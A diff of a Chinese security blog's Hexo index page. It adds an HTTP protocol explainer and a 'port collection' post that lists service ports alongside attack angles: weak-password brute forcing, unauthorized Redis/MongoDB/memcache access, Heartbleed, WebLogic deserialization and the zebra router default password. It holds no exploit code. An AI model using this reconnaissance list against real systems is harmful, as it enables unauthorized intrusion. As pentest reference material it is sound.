+<p>URL是uniform resource locator，统一资源定位器，它是一种具体的URI，即URL可以用来标识一个资源，而且还指明了如何locate这个资源。<br>URL是Internet上用来描述信息资源的字符串，主要用在各种WWW客户程序和服务器程序上，特别是著名的Mosaic。<br>采用URL可以用一种统一的格式来描述各种信息资源，包括文件、服务器的地址和目录等。URL一般由三部组成：<br>①协议(或称为服务方式)<br>②存有该资源的主机IP地址(有时也包括端口号)<br>③主机资源的具体地址。如目录和文件名等</p>
+<p>URN，uniform resource name，统一资源命名，是通过名字来标识资源，比如mailto:java-net@java.sun.com。<br>URI是以一种抽象的，高层次概念定义统一资源标识，而URL和URN则是具体的资源标识的方式。URL和URN都是一种URI。笼统地说，每个 URL 都是 URI，但不一定每个 URI 都是 URL。这是因为 URI 还包括一个子类，即统一资源名称 (URN)，它命名资源但不指定如何定位资源。上面的 mailto、news 和 isbn URI 都是 URN 的示例。</p>
+<p>在Java的URI中，一个URI实例可以代表绝对的，也可以是相对的，只要它符合URI的语法规则。而URL类则不仅符合语义，还包含了定位该资源的信息，因此它不能是相对的。<br>在Java类库中，URI类不包含任何访问资源的方法，它唯一的作用就是解析。<br>相反的是，URL类可以打开一个到达资源的流。</p>
+<h4 id="HTTP之请求消息Request"><a href="#HTTP之请求消息Request" class="headerlink" title="HTTP之请求消息Request"></a>HTTP之请求消息Request</h4><p>客户端发送一个HTTP请求到服务器的请求消息包括以下格式：</p>
+<h5 id="请求行（request-line）、请求头部（header）、空行和请求数据四个部分组成。"><a href="#请求行（request-line）、请求头部（header）、空行和请求数据四个部分组成。" class="headerlink" title="请求行（request line）、请求头部（header）、空行和请求数据四个部分组成。"></a>请求行（request line）、请求头部（header）、空行和请求数据四个部分组成。</h5><ul>
+<li><p>请求行以一个方法符号开头，以空格分开，后面跟着请求的URI和协议的版本。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">GET /562f25980001b1b106000338.jpg HTTP/1.1</div><div class="line">Host    img.mukewang.com</div><div class="line">User-Agent  Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36</div><div class="line">Accept  image/webp,image/*,*/*;q=0.8</div><div class="line">Referer http://www.imooc.com/</div><div class="line">Accept-Encoding gzip, deflate, sdch</div><div class="line">Accept-Language zh-CN,zh;q=0.8</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>第一部分：请求行，用来说明请求类型,要访问的资源以及所使用的HTTP版本.<br>GET说明请求类型为GET,[/562f25980001b1b106000338.jpg]为要访问的资源，该行的最后一部分说明使用的是HTTP1.1版本。<br>第二部分：请求头部，紧接着请求行（即第一行）之后的部分，用来说明服务器要使用的附加信息<br>从第二行起为请求头部，HOST将指出请求的目的地.User-Agent,服务器端和客户端脚本都能访问它,它是浏览器类型检测逻辑的重要基础.该信息由你的浏览器来定义,并且在每个请求中自动发送等等<br>第三部分：空行，请求头部后面的空行是必须的<br>即使第四部分的请求数据为空，也必须有空行。<br>第四部分：请求数据也叫主体，可以添加任意的其他数据。<br>这个例子的请求数据为空。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">POST / HTTP1.1</div><div class="line">Host:www.wrox.com</div><div class="line">User-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)</div><div class="line">Content-Type:application/x-www-form-urlencoded</div><div class="line">Content-Length:40</div><div class="line">Connection: Keep-Alive</div><div class="line"></div><div class="line">name=Professional%20Ajax&amp;publisher=Wiley</div></pre></td></tr></table></figure>
+<p>第一部分：请求行，第一行明了是post请求，以及http1.1版本。<br>第二部分：请求头部，第二行至第六行。<br>第三部分：空行，第七行的空行。<br>第四部分：请求数据，第八行。</p>
+<h4 id="HTTP之响应消息Response"><a href="#HTTP之响应消息Response" class="headerlink" title="HTTP之响应消息Response"></a>HTTP之响应消息Response</h4><h5 id="HTTP响应也由四个部分组成，分别是：状态行、消息报头、空行和响应正文。"><a href="#HTTP响应也由四个部分组成，分别是：状态行、消息报头、空行和响应正文。" class="headerlink" title="HTTP响应也由四个部分组成，分别是：状态行、消息报头、空行和响应正文。"></a>HTTP响应也由四个部分组成，分别是：状态行、消息报头、空行和响应正文。</h5><p><img src="https://upload-images.jianshu.io/upload_images/2964446-1c4cab46f270d8ee.jpg?imageMogr2/auto-orient/" alt="img"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">第一部分：状态行，由HTTP协议版本号， 状态码， 状态消息 三部分组成。</div><div class="line">第一行为状态行，（HTTP/1.1）表明HTTP版本为1.1版本，状态码为200，状态消息为（ok）</div><div class="line">第二部分：消息报头，用来说明客户端要使用的一些附加信息</div><div class="line">第二行和第三行为消息报头，</div><div class="line">Date:生成响应的日期和时间；Content-Type:指定了MIME类型的HTML(text/html),编码类型是UTF-8</div><div class="line">第三部分：空行，消息报头后面的空行是必须的</div><div class="line">第四部分：响应正文，服务器返回给客户端的文本信息。</div><div class="line">空行后面的html部分为响应正文。</div></pre></td></tr></table></figure>
+<h4 id="HTTP之状态码"><a href="#HTTP之状态码" class="headerlink" title="HTTP之状态码"></a>HTTP之状态码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">状态代码有三位数字组成，第一个数字定义了响应的类别，共分五种类别:</div><div class="line">1xx：指示信息--表示请求已接收，继续处理</div><div class="line">2xx：成功--表示请求已被成功接收、理解、接受</div><div class="line">3xx：重定向--要完成请求必须进行更进一步的操作</div><div class="line">4xx：客户端错误--请求有语法错误或请求无法实现</div><div class="line">5xx：服务器端错误--服务器未能实现合法的请求</div></pre></td></tr></table></figure>
+<h4 id="HTTP请求方法"><a href="#HTTP请求方法" class="headerlink" title="HTTP请求方法"></a>HTTP请求方法</h4><p>根据HTTP标准，HTTP请求可以使用多种请求方法。<br>HTTP1.0定义了三种请求方法： GET, POST 和 HEAD方法。<br>HTTP1.1新增了五种请求方法：OPTIONS, PUT, DELETE, TRACE 和 CONNECT 方法。</p>
+<h4 id="HTTP工作原理"><a href="#HTTP工作原理" class="headerlink" title="HTTP工作原理"></a>HTTP工作原理</h4><p>HTTP协议定义Web客户端如何从Web服务器请求Web页面，以及服务器如何把Web页面传送给客户端。HTTP协议采用了请求/响应模型。客户端向服务器发送一个请求报文，请求报文包含请求的方法、URL、协议版本、请求头部和请求数据。服务器以一个状态行作为响应，响应的内容包括协议的版本、成功或者错误代码、服务器信息、响应头部和响应数据。</p>
+<p>以下是 HTTP 请求/响应的步骤：</p>
+<p>1、客户端连接到Web服务器<br>一个HTTP客户端，通常是浏览器，与Web服务器的HTTP端口（默认为80）建立一个TCP套接字连接。例如，<a href="http://www.oakcms.cn。" target="_blank" rel="external">http://www.oakcms.cn。</a></p>
+<p>2、发送HTTP请求<br>通过TCP套接字，客户端向Web服务器发送一个文本的请求报文，一个请求报文由请求行、请求头部、空行和请求数据4部分组成。</p>
+<p>3、服务器接受请求并返回HTTP响应<br>Web服务器解析请求，定位请求资源。服务器将资源复本写到TCP套接字，由客户端读取。一个响应由状态行、响应头部、空行和响应数据4部分组成。</p>
+<p>4、释放连接TCP连接<br>若connection 模式为close，则服务器主动关闭TCP连接，客户端被动关闭连接，释放TCP连接;若connection 模式为keepalive，则该连接会保持一段时间，在该时间内可以继续接收请求;</p>
+<p>5、客户端浏览器解析HTML内容<br>客户端浏览器首先解析状态行，查看表明请求是否成功的状态代码。然后解析每一个响应头，响应头告知以下为若干字节的HTML文档和文档的字符集。客户端浏览器读取响应数据HTML，根据HTML的语法对其进行格式化，并在浏览器窗口中显示。</p>
+<p>例如：在浏览器地址栏键入URL，按下回车之后会经历以下流程：</p>
+<p>1、浏览器向 DNS 服务器请求解析该 URL 中的域名所对应的 IP 地址;</p>
+<p>2、解析出 IP 地址后，根据该 IP 地址和默认端口 80，和服务器建立TCP连接;</p>
+<p>3、浏览器发出读取文件(URL 中域名后面部分对应的文件)的HTTP 请求，该请求报文作为 TCP 三次握手的第三个报文的数据发送给服务器;</p>
+<p>4、服务器对浏览器请求作出响应，并把对应的 html 文本发送给浏览器;</p>
+<p>5、释放 TCP连接;</p>
+<p>6、浏览器将该 html 文本并显示内容;</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://wsygoogol.github.io/2016/12/23/HTTP-协议/" data-id="cjbomviwr0003t01b6fsapyxv" class="article-share-link">Partager</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-端口大集合" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/12/04/端口大集合/" class="article-date">
+  <time datetime="2016-12-04T02:24:31.000Z" itemprop="datePublished">2016-12-04</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/12/04/端口大集合/">端口大集合</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>###1,web类(web漏洞/敏感目录)<br>第三方通用组件漏洞struts thinkphp jboss ganglia zabbix<br>80 web<br>80-89 web<br>8000-9090 web</p>
+<p>###2,数据库类(扫描弱口令)<br>1433 MSSQL<br>1521 Oracle<br>3306 MySQL<br>5432 PostgreSQL</p>
+<p>###3,特殊服务类(未授权/命令执行类/漏洞)<br>443 SSL心脏滴血<br>873 Rsync未授权<br>5984 CouchDB <a href="http://xxx:5984/_utils/" target="_blank" rel="external">http://xxx:5984/_utils/</a><br>6379 redis未授权<br>7001,7002 WebLogic默认弱口令，反序列<br>9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞<br>11211 memcache未授权访问<br>27017,27018 Mongodb未授权访问<br>50000 SAP命令执行<br>50070,50030 hadoop默认端口未授权访问</p>
+<p>###4,常用端口类(扫描弱口令/端口爆破)<br>21 ftp<br>22 SSH<br>23 Telnet<br>2601,2604 zebra路由，默认密码zebra<br>3389 远程桌面<br>端口合计详情<br>21 ftp<br>22 SSH<br>23 Telnet<br>80 web<br>80-89 web<br>161 SNMP<br>389 LDAP<br>443 SSL心脏滴血以及一些web漏洞测试<br>445 SMB<br>512,513,514 Rexec<br>873 Rsync未授权<br>1025,111 NFS<br>1433 MSSQL<br>1521 Oracle:(iSqlPlus Port:5560,7778)<br>2082/2083 cpanel主机管理系统登陆 （国外用较多）<br>2222 DA虚拟主机管理系统登陆 （国外用较多）<br>2601,2604 zebra路由，默认密码zebra<br>3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了<br>3306 MySQL<br>3312/3311 kangle主机管理系统登陆<br>3389 远程桌面<br>4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网<br>5432 PostgreSQL<br>5900 vnc<br>5984 CouchDB <a href="http://xxx:5984/_utils/" target="_blank" rel="external">http://xxx:5984/_utils/</a><br>6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网<br>6379 redis未授权<br>7001,7002 WebLogic默认弱口令，反序列<br>7778 Kloxo主机控制面板登录<br>8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上<br>8080 tomcat/WDCP主机管理系统，默认弱口令<br>8080,8089,9090 JBOSS<br>8083 Vestacp主机管理系统 （国外用较多）<br>8649 ganglia<br>8888 amh/LuManager 主机管理系统默认端口<br>9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞<br>10000 Virtualmin/Webmin 服务器虚拟主机管理系统<br>11211 memcache未授权访问<br>27017,27018 Mongodb未授权访问<br>28017 mongodb统计页面<br>50000 SAP命令执行<br>50070,50030 hadoop默认端口未授权访问</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://wsygoogol.github.io/2016/12/04/端口大集合/" data-id="cjbomvixl000ot01bruuwo0ic" class="article-share-link">Partager</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="w-Java反序列化漏洞" class="article article-type-w" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2016/10/10/Java反序列化漏洞/" class="article-date">
@@ -107,7 +307,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2016/10/10/Java反序列化漏洞/" data-id="cjbok9s0v000cog1bu2n8ht07" class="article-share-link">Partager</a>
+      <a data-url="http://wsygoogol.github.io/2016/10/10/Java反序列化漏洞/" data-id="cjbomviwv0005t01by7pkdg21" class="article-share-link">Partager</a>
       
       
     </footer>
@@ -179,7 +379,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2016/09/18/WAF-Bypass-技巧总结/" data-id="cjbok9s0w000dog1bfpm3ibfs" class="article-share-link">Partager</a>
+      <a data-url="http://wsygoogol.github.io/2016/09/18/WAF-Bypass-技巧总结/" data-id="cjbomvix9000dt01bl21xpmkb" class="article-share-link">Partager</a>
       
       
     </footer>
@@ -223,7 +423,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2016/08/11/sqlmap-使用/" data-id="cjbok9s0x000eog1bk7bn6wg6" class="article-share-link">Partager</a>
+      <a data-url="http://wsygoogol.github.io/2016/08/11/sqlmap-使用/" data-id="cjbomvixb000gt01boe2lsmy0" class="article-share-link">Partager</a>
       
       
     </footer>
@@ -280,7 +480,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2016/08/08/OGNL机制和Struts2漏洞利用原理研究/" data-id="cjbok9s0u000bog1b0k1rg72r" class="article-share-link">Partager</a>
+      <a data-url="http://wsygoogol.github.io/2016/08/08/OGNL机制和Struts2漏洞利用原理研究/" data-id="cjbomvix8000ct01bgzup28n7" class="article-share-link">Partager</a>
       
       
     </footer>
@@ -324,7 +524,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2016/07/15/Spring-Boot框架SPEL表达式注入漏洞/" data-id="cjbok9s0r000aog1bbqotqcl4" class="article-share-link">Partager</a>
+      <a data-url="http://wsygoogol.github.io/2016/07/15/Spring-Boot框架SPEL表达式注入漏洞/" data-id="cjbomvix6000at01bzss00wj4" class="article-share-link">Partager</a>
       
       
     </footer>
@@ -426,7 +626,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2016/06/29/面试一年前的自己/" data-id="cjbok9s14000log1bfbk79k34" class="article-share-link">Partager</a>
+      <a data-url="http://wsygoogol.github.io/2016/06/29/面试一年前的自己/" data-id="cjbomvixl000pt01br31cafhj" class="article-share-link">Partager</a>
       
       
     </footer>
@@ -482,106 +682,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2016/06/18/sql注入之数据库识别/" data-id="cjbok9s0z000fog1btc4935q0" class="article-share-link">Partager</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-Hexo-搭建Blog教程" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2016/06/18/Hexo-搭建Blog教程/" class="article-date">
-  <time datetime="2016-06-18T11:48:25.000Z" itemprop="datePublished">2016-06-18</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/06/18/Hexo-搭建Blog教程/">Hexo 搭建Blog教程</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>平时在浏览博客的时候发现好多人喜欢利用Hexo + Github搭建个人博客，正好一直也想搭建一个博客去记录和分享。在此过程中，折腾各种配置花了一些时间，所以详细记录一下遇到的相关问题。</p>
-<h3 id="1-安装Git"><a href="#1-安装Git" class="headerlink" title="1.安装Git"></a>1.安装Git</h3><p>下载<a href="https://git-scm.com/download/win" target="_blank" rel="external">git</a>,安装很简单，一路next下去</p>
-<h3 id="2-安装Node-js"><a href="#2-安装Node-js" class="headerlink" title="2.安装Node.js"></a>2.安装Node.js</h3><p>下载<a href="https://nodejs.org/en/" target="_blank" rel="external">node.js</a>，安装也是一路next</p>
-<h3 id="3-本地搭建hexo博客"><a href="#3-本地搭建hexo博客" class="headerlink" title="3.本地搭建hexo博客"></a>3.本地搭建hexo博客</h3><p>安装hexo<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ npm install -g hexo-cli</div></pre></td></tr></table></figure></p>
-<p>测试hexo是否安装成功<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo version</div></pre></td></tr></table></figure></p>
-<p>新建一个文件夹，如MyBlog<br>进入该文件夹内，右击运行git，依次输入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ hexo init</div><div class="line">$ npm install</div><div class="line">$ hexo g</div><div class="line">$ hexo s</div></pre></td></tr></table></figure></p>
-<p>这时候在浏览器输入<a href="http://localhost:4000/" target="_blank" rel="external">http://localhost:4000/</a> 就可以看到hexo已经成功生成了博客，当然这只是我们本地可以看到的</p>
-<h3 id="3-Github配置"><a href="#3-Github配置" class="headerlink" title="3.Github配置"></a>3.Github配置</h3><p>登陆github后点击new repository，Repository name填写自己的名称 + .github.io，<br><img src="/upload_image/1.jpg" alt=""><br>直接点Create repository就可以了。</p>
-<h3 id="4-配置Github-SSH密钥"><a href="#4-配置Github-SSH密钥" class="headerlink" title="4.配置Github SSH密钥"></a>4.配置Github SSH密钥</h3><p>在桌面空白处鼠标右键选择Git Bash Here<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ ssh-keygen -t rsa -C <span class="string">"your's emaill address"</span></div></pre></td></tr></table></figure></p>
-<p>引号里面的内容输入你的邮箱地址，然后回车，会提示你文件保存的路径，按回车键确认<br>然后会提示你输入密码，然后会确认输入一次，就可以在刚刚的路径看到生成了两个文件，一个是id_rsa，另一个是id_rsa.pub，用notepadd++打开id_rsa.pub然后选中里面的全部内容，复制下来。<br>登陆github，点击头像进入setting选项<br><img src="/upload_image/2.jpg" alt=""></p>
-<h3 id="5-将hexo博客与Github关联"><a href="#5-将hexo博客与Github关联" class="headerlink" title="5.将hexo博客与Github关联"></a>5.将hexo博客与Github关联</h3><p>修改_config.yml<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">deploy:</div><div class="line">  <span class="built_in">type</span>: git</div><div class="line">  repository: http://github.com/yourname/yourname.github.io.git</div><div class="line">  branch: master</div></pre></td></tr></table></figure></p>
-<p>打开Git bash here<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ hexo g</div><div class="line">$ hexo d</div></pre></td></tr></table></figure></p>
-<p>如果出现如下异常<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ERROR Deployer not found: git</div></pre></td></tr></table></figure></p>
-<p>输入以下命令，然后重新执行上面两条命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ npm install hexo-deployer-git --save</div></pre></td></tr></table></figure></p>
-<p>这时候如果弹出一个对话框，输入在guthub上面的用户名和密码即可<br>这时候我们就可以在浏览器输入<a href="http://yourname.github.io（yourname替换成github上的名称）就可以看到博客已经搭建成功了。" target="_blank" rel="external">http://yourname.github.io（yourname替换成github上的名称）就可以看到博客已经搭建成功了。</a></p>
-<h3 id="更新博客内容"><a href="#更新博客内容" class="headerlink" title="更新博客内容"></a>更新博客内容</h3><p>在MyBlog目录下执行：hexo new “我的第一篇文章”，会在source-&gt;_posts文件夹内生成一个.md文件。<br>编辑该文件（遵循Markdown规则）<br>修改起始字段<br>title 文章的标题<br>date 创建日期 （文件的创建日期 ）<br>updated 修改日期 （ 文件的修改日期）<br>comments 是否开启评论 true<br>tags 标签<br>categories 分类<br>permalink url中的名字（文件名）<br>编写正文内容（MakeDown）<br>hexo clean 删除本地静态文件（Public目录），可不执行。<br>hexo g 生成本地静态文件（Public目录）<br>hexo deploy 将本地静态文件推送至github（hexo d）</p>
-<h4 id="MarkDown语法"><a href="#MarkDown语法" class="headerlink" title="MarkDown语法"></a>MarkDown语法</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">[hexo](http://www.baidu.com)  表示超链接</div><div class="line"><span class="comment">##大标题</span></div><div class="line"><span class="comment">###小标题</span></div><div class="line">&lt;!-- more --&gt;</div><div class="line">&lt;!-- 标签别名 --&gt;</div><div class="line">&#123;% cq %&#125;blah blah blah&#123;% endcq %&#125;</div><div class="line">空格  中文全角空格表示</div><div class="line">---</div><div class="line">文章标题</div><div class="line">---</div><div class="line">&gt;内容     区块引用</div><div class="line">*1</div><div class="line">*2</div><div class="line">*3</div><div class="line">列表</div><div class="line">*内容*     表示强调内容</div><div class="line">![Alt text](/path/to/img.jpg)  图片</div><div class="line">![](/upload_image/20161012/1.png)</div></pre></td></tr></table></figure>
-<blockquote class="blockquote-center"></blockquote>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2016/06/18/Hexo-搭建Blog教程/" data-id="cjbok9s0j0006og1b1j6vtrvf" class="article-share-link">Partager</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2016/06/08/hello-world/" class="article-date">
-  <time datetime="2016-06-08T01:46:54.000Z" itemprop="datePublished">2016-06-08</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/06/08/hello-world/">Hello World</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2016/06/08/hello-world/" data-id="cjbok9s0p0009og1b23kq37ko" class="article-share-link">Partager</a>
+      <a data-url="http://wsygoogol.github.io/2016/06/18/sql注入之数据库识别/" data-id="cjbomvixb000ft01b3tx7083p" class="article-share-link">Partager</a>
       
       
     </footer>
@@ -594,7 +695,7 @@
 
 
   <nav id="page-nav">
-    <a class="extend prev" rel="prev" href="/">&laquo; __('prev')</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+    <a class="extend prev" rel="prev" href="/">&laquo; __('prev')</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">__('next') &raquo;</a>
   </nav>
 </section>
         
@@ -612,7 +713,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">December 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/10/">October 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/02/">February 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">December 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li></ul>
     </div>
   </div>
 
@@ -637,11 +738,11 @@
           </li>
         
           <li>
-            <a href="/2017/09/12/Java反序列化漏洞利用的学习与实践/">Java反序列化漏洞利用的学习与实践</a>
+            <a href="/2017/10/27/HTTP-fuzzing-List/">HTTP fuzzing List</a>
           </li>
         
           <li>
-            <a href="/2017/08/11/机器学习再信息安全中的应用/">机器学习在信息安全中的应用</a>
+            <a href="/2017/09/12/Java反序列化漏洞利用的学习与实践/">Java反序列化漏洞利用的学习与实践</a>
           </li>
         
       </ul>
